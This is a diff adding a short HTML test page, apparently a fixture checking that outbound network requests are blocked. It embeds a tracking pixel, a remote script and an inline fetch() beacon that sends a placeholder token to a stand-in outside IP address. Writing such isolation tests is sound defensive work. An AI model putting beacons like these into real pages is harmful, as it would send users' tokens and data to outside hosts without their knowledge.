@@ -1,0 +1,10 @@
+<!doctype html>
+<html lang="en">
+<head><meta charset="utf-8"><title>Reaches for the internet</title></head>
+<body>
+  <h1>Tries to reach external hosts</h1>
+  <img src="http://192.0.2.1/tracker.png" alt="">
+  <script src="https://example.invalid/analytics.js"></script>
+  <script>fetch('http://198.51.100.7/beacon?token=SHOULD_NOT_APPEAR').catch(() => {});</script>
+</body>
+</html>
